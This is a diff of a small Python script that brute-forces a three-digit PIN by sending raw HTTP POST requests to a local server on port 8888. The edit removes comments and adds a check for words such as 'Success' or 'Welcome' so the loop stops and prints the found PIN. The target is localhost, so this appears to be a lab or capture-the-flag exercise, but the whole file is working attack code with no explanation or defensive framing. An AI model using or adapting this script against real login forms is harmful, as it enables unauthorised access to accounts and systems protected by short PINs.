@@ -1,14 +1,12 @@
 import socket
 
 HOST = '127.0.0.1'
-PORT = 8888  # might be diff on ur machine
+PORT = 8888
 
-# trying all 3digit pins
 for i in range(1000):
-    guess = str(i).zfill(3)  # ex: '007', '123'
+    guess = str(i).zfill(3)
     data = f"pin={guess}"
 
-    # manual http post request (raw)
     req = (
         "POST / HTTP/1.1\r\n"
         f"Host: {HOST}:{PORT}\r\n"
@@ -33,9 +31,15 @@ for i in range(1000):
 
         output = result.decode(errors="ignore")
 
-        print(f"Trying [{guess}] --> {output.splitlines()[0]}")
+        # look for a keyword that signals correct pin
+        if "Success" in output or "Welcome" in output or "Correct" in output:
+            print(f"[🎉] PIN FOUND: {guess}")
+            break
+        else:
+            print(f"Try {guess} -> no luck")
+
         sock.close()
 
     except Exception as err:
-        print(f"[!] Error on pin {guess}: {err}")
+        print(f"[x] pin {guess} failed: {err}")
         continue
